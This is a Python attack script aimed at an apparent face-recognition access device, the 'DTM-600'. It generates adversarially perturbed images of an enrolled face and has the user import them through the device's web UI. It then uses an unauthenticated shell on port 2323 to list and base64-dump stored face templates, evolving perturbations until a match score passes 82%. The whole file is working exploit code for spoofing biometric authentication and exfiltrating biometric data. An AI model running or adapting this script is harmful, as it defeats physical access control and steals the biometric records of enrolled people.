#!/usr/bin/env python3
"""
Batch Adversarial Attack for DTM-600
Generates multiple perturbed images for batch import, then analyzes results.

Workflow:
    1. Generate batch of perturbed images
    2. User batch imports via web UI
    3. Script extracts all templates and finds best match
    4. Generate next batch based on best performers
    5. Repeat until >82% achieved

Usage:
    # Generate initial batch
    python3 adversarial_batch.py --generate --cover FromDigitalAlly/enrolled_face_4026846050.jpg --count 20

    # After batch import, analyze results
    python3 adversarial_batch.py --analyze

    # Generate next batch based on best performers
    python3 adversarial_batch.py --evolve --count 20
"""

import argparse
import base64
import json
import numpy as np
import pickle
import socket
import struct
import time
from datetime import datetime
from pathlib import Path
from typing import List, Tuple

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False


DEVICE_IP = "192.168.30.178"
TARGET_TEMPLATE = "user_target_template.bin"
STATE_FILE = "ADVERSARIAL_RESULTS/batch_state.pkl"
BATCH_DIR = Path("ADVERSARIAL_RESULTS/batch")
LIB_ID = 3
TARGET_SIM = 0.82
EPSILON = 16


def load_image(path):
    if HAS_CV2:
        return cv2.imread(str(path))
    elif HAS_PIL:
        img = np.array(Image.open(path))
        if len(img.shape) == 3 and img.shape[2] == 3:
            img = img[:, :, ::-1]
        return img
    raise RuntimeError("No image library")


def save_image(path, img):
    if HAS_CV2:
        cv2.imwrite(str(path), img)
    elif HAS_PIL:
        if len(img.shape) == 3 and img.shape[2] == 3:
            img = img[:, :, ::-1]
        Image.fromarray(img).save(str(path))


def load_target_template(path):
    data = Path(path).read_bytes()
    if len(data) != 1044:
        raise ValueError(f"Invalid template size: {len(data)}")
    embedding = np.frombuffer(data[20:], dtype=np.float32).copy()
    norm = np.linalg.norm(embedding)
    if norm > 0:
        embedding /= norm
    return embedding


def get_all_templates(lib_id=LIB_ID) -> List[Tuple[str, np.ndarray]]:
    """Extract all templates from a library."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((DEVICE_IP, 2323))
    time.sleep(0.3)
    sock.recv(4096)

    # List all template files
    cmd = f"ls /data/WorkLibFile/{lib_id}/PersonID_*/FaceID_*.bin 2>/dev/null\n"
    sock.send(cmd.encode())
    time.sleep(2)

    result = b""
    while True:
        try:
            sock.settimeout(2)
            chunk = sock.recv(8192)
            if not chunk:
                break
            result += chunk
        except socket.timeout:
            break

    result_text = result.decode('utf-8', errors='ignore')
    template_paths = [l.strip() for l in result_text.split('\n')
                      if '.bin' in l and 'FaceID' in l and l.strip().startswith('/')]

    templates = []
    for tpath in template_paths:
        face_id = tpath.split('FaceID_')[-1].replace('.bin', '')

        # Extract template
        sock.send(f"base64 {tpath}\n".encode())
        time.sleep(1)

        b64_output = b""
        while True:
            try:
                sock.settimeout(1)
                chunk = sock.recv(8192)
                if not chunk:
                    break
                b64_output += chunk
                if len(b64_output) > 5000:
                    break
            except socket.timeout:
                break

        # Parse
        b64_text = b64_output.decode('utf-8', errors='ignore').replace('\r', '')
        lines = b64_text.split('\n')
        b64_lines = []
        capture = False
        for line in lines:
            line = line.strip()
            if 'base64' in line:
                capture = True
                continue
            if line.startswith('/ #'):
                break
            if capture and line:
                b64_lines.append(line)

        b64_data = ''.join(b64_lines)
        try:
            template_data = base64.b64decode(b64_data)
            if len(template_data) == 1044:
                embedding = np.frombuffer(template_data[20:], dtype=np.float32).copy()
                templates.append((face_id, embedding))
        except:
            pass

    sock.close()
    return templates


def compute_similarity(emb1, emb2):
    norm1 = np.linalg.norm(emb1)
    norm2 = np.linalg.norm(emb2)
    if norm1 == 0 or norm2 == 0:
        return 0.0
    return float(np.dot(emb1/norm1, emb2/norm2))


class BatchState:
    def __init__(self):
        self.cover_image = None
        self.perturbations = []  # List of perturbation arrays
        self.results = []  # List of (idx, face_id, similarity)
        self.best_perturbations = []  # Top performers for evolution
        self.generation = 0
        self.best_sim = 0.0

    def save(self):
        BATCH_DIR.mkdir(parents=True, exist_ok=True)
        with open(STATE_FILE, 'wb') as f:
            pickle.dump(self, f)

    @staticmethod
    def load():
        if Path(STATE_FILE).exists():
            with open(STATE_FILE, 'rb') as f:
                return pickle.load(f)
        return None


def generate_batch(cover_path: str, count: int, base_perturbation=None):
    """Generate a batch of perturbed images with varied strategies."""
    print(f"[*] Loading cover image: {cover_path}")
    cover = load_image(cover_path)
    if cover is None:
        print("[!] Failed to load cover image")
        return

    h, w = cover.shape[:2]
    channels = cover.shape[2] if len(cover.shape) == 3 else 1

    state = BatchState()
    state.cover_image = cover.astype(np.float32)
    state.generation += 1

    BATCH_DIR.mkdir(parents=True, exist_ok=True)

    # Clear old batch
    for f in BATCH_DIR.glob("*.jpg"):
        f.unlink()

    print(f"[*] Generating {count} perturbed images with varied strategies...")

    for i in range(count):
        # Choose perturbation strategy
        strategy = i % 5

        if base_perturbation is not None:
            # Evolve from base
            pert = base_perturbation.copy()
            num_mutations = np.random.randint(20, 100)
            for _ in range(num_mutations):
                y = np.random.randint(0, h)
                x = np.random.randint(0, w)
                c = np.random.randint(0, channels) if channels > 1 else 0
                delta = np.random.uniform(-EPSILON/2, EPSILON/2)
                if channels > 1:
                    pert[y, x, c] = np.clip(pert[y, x, c] + delta, -EPSILON, EPSILON)
                else:
                    pert[y, x] = np.clip(pert[y, x] + delta, -EPSILON, EPSILON)

        elif strategy == 0:
            # Dense random - full image perturbation
            pert = np.random.uniform(-EPSILON, EPSILON, size=cover.shape).astype(np.float32)

        elif strategy == 1:
            # Sparse random - 10% of pixels
            pert = np.random.uniform(-EPSILON, EPSILON, size=cover.shape).astype(np.float32)
            mask = np.random.rand(*cover.shape) > 0.90
            pert = pert * mask

        elif strategy == 2:
            # Block perturbation - random rectangles
            pert = np.zeros_like(cover, dtype=np.float32)
            num_blocks = np.random.randint(3, 10)
            for _ in range(num_blocks):
                bh = np.random.randint(20, h//4)
                bw = np.random.randint(20, w//4)
                by = np.random.randint(0, h - bh)
                bx = np.random.randint(0, w - bw)
                block_val = np.random.uniform(-EPSILON, EPSILON)
                pert[by:by+bh, bx:bx+bw] = block_val

        elif strategy == 3:
            # Gradient perturbation - smooth transitions
            pert = np.zeros_like(cover, dtype=np.float32)
            # Vertical gradient
            for row in range(h):
                val = EPSILON * (2 * row / h - 1) * np.random.choice([-1, 1])
                pert[row, :] = val
            # Add noise
            pert += np.random.uniform(-EPSILON/4, EPSILON/4, size=cover.shape)
            pert = np.clip(pert, -EPSILON, EPSILON)

        else:  # strategy == 4
            # Face-region focused - perturb center more
            pert = np.random.uniform(-EPSILON, EPSILON, size=cover.shape).astype(np.float32)
            # Create gaussian mask centered on image
            y_grid, x_grid = np.ogrid[:h, :w]
            center_y, center_x = h // 2, w // 2
            sigma = min(h, w) // 3
            gauss_mask = np.exp(-((y_grid - center_y)**2 + (x_grid - center_x)**2) / (2 * sigma**2))
            if channels > 1:
                gauss_mask = gauss_mask[:, :, np.newaxis]
            pert = pert * gauss_mask

        state.perturbations.append(pert)

        # Generate image
        perturbed = np.clip(cover.astype(np.float32) + pert, 0, 255).astype(np.uint8)
        img_path = BATCH_DIR / f"batch_{i:04d}.jpg"
        save_image(img_path, perturbed)

        if (i + 1) % 50 == 0:
            print(f"  Generated {i + 1}/{count}...")

    state.save()

    print(f"[+] Generated {count} images in {BATCH_DIR}/")
    print(f"\n>>> Batch import all images from {BATCH_DIR}/ via web UI")
    print(f">>> Then run: python3 {__file__} --analyze")


def analyze_batch():
    """Analyze templates after batch import."""
    state = BatchState.load()
    if state is None:
        print("[!] No batch state. Run --generate first.")
        return

    # Load target
    target = load_target_template(TARGET_TEMPLATE)

    # Get all templates
    print("[*] Extracting all templates from device...")
    templates = get_all_templates()
    print(f"[+] Found {len(templates)} templates")

    if not templates:
        print("[!] No templates found. Make sure batch import completed.")
        return

    # Compute similarities
    results = []
    for face_id, emb in templates:
        sim = compute_similarity(emb, target)
        results.append((face_id, sim))

    # Sort by similarity
    results.sort(key=lambda x: x[1], reverse=True)

    print(f"\n{'='*50}")
    print("BATCH RESULTS")
    print(f"{'='*50}")

    best_sim = 0.0
    best_face_id = None

    for i, (fid, sim) in enumerate(results[:10]):
        marker = " <-- BEST" if i == 0 else ""
        print(f"  {i+1}. FaceID {fid}: {sim:.4f} ({sim*100:.2f}%){marker}")
        if i == 0:
            best_sim = sim
            best_face_id = fid

    state.best_sim = best_sim
    state.results = results
    state.save()

    if best_sim >= TARGET_SIM:
        print(f"\n[+] SUCCESS! FaceID {best_face_id} achieved {best_sim:.4f} >= {TARGET_SIM}")
        return

    print(f"\n[-] Best: {best_sim:.4f}, need {TARGET_SIM:.0%}")
    print(f">>> Run: python3 {__file__} --evolve --count 20")


def evolve_batch(count: int):
    """Generate next batch evolved from best performers."""
    state = BatchState.load()
    if state is None or not state.results:
        print("[!] No results to evolve from. Run --analyze first.")
        return

    if state.cover_image is None:
        print("[!] No cover image in state. Run --generate first.")
        return

    # Find best perturbation
    # Since we don't track which perturbation maps to which face_id after import,
    # we'll evolve from a random combination of the stored perturbations
    if state.perturbations:
        # Pick a random good perturbation as base
        base_idx = np.random.randint(0, min(5, len(state.perturbations)))
        base_pert = state.perturbations[base_idx]
        print(f"[*] Evolving from perturbation {base_idx}")
    else:
        base_pert = None

    # Generate new batch
    cover = state.cover_image
    h, w = cover.shape[:2]
    channels = cover.shape[2] if len(cover.shape) == 3 else 1

    state.perturbations = []
    state.generation += 1

    # Clear old batch
    for f in BATCH_DIR.glob("*.jpg"):
        f.unlink()

    print(f"[*] Generating evolved batch (gen {state.generation})...")

    for i in range(count):
        if base_pert is not None:
            pert = base_pert.copy()
            # Mutations
            num_mutations = np.random.randint(10, 50)
            for _ in range(num_mutations):
                y = np.random.randint(0, h)
                x = np.random.randint(0, w)
                c = np.random.randint(0, channels) if channels > 1 else 0
                delta = np.random.uniform(-EPSILON/2, EPSILON/2)
                if channels > 1:
                    pert[y, x, c] = np.clip(pert[y, x, c] + delta, -EPSILON, EPSILON)
                else:
                    pert[y, x] = np.clip(pert[y, x] + delta, -EPSILON, EPSILON)
        else:
            pert = np.random.uniform(-EPSILON, EPSILON, size=cover.shape).astype(np.float32)
            mask = np.random.rand(*cover.shape) > 0.9
            pert = pert * mask

        state.perturbations.append(pert)

        perturbed = np.clip(cover + pert, 0, 255).astype(np.uint8)
        img_path = BATCH_DIR / f"batch_{i:03d}.jpg"
        save_image(img_path, perturbed)

    state.save()

    print(f"[+] Generated {count} evolved images in {BATCH_DIR}/")
    print(f"\n>>> Batch import via web UI, then run: python3 {__file__} --analyze")


def show_status():
    state = BatchState.load()
    if state is None:
        print("[!] No batch state.")
        return

    print(f"Generation: {state.generation}")
    print(f"Best similarity: {state.best_sim:.4f} ({state.best_sim*100:.2f}%)")
    print(f"Target: {TARGET_SIM:.0%}")
    print(f"Perturbations stored: {len(state.perturbations)}")
    print(f"Results stored: {len(state.results)}")


def main():
    parser = argparse.ArgumentParser(description="Batch adversarial attack")
    parser.add_argument("--generate", action="store_true", help="Generate initial batch")
    parser.add_argument("--cover", help="Cover image path")
    parser.add_argument("--count", type=int, default=20, help="Batch size")
    parser.add_argument("--analyze", action="store_true", help="Analyze after import")
    parser.add_argument("--evolve", action="store_true", help="Generate evolved batch")
    parser.add_argument("--status", action="store_true", help="Show status")
    parser.add_argument("--target", default=DEVICE_IP, help="Device IP")
    parser.add_argument("--template", default=TARGET_TEMPLATE, help="Target template")

    args = parser.parse_args()

    if args.generate:
        if not args.cover:
            print("[!] --cover required")
            return
        generate_batch(args.cover, args.count)
    elif args.analyze:
        analyze_batch()
    elif args.evolve:
        evolve_batch(args.count)
    elif args.status:
        show_status()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
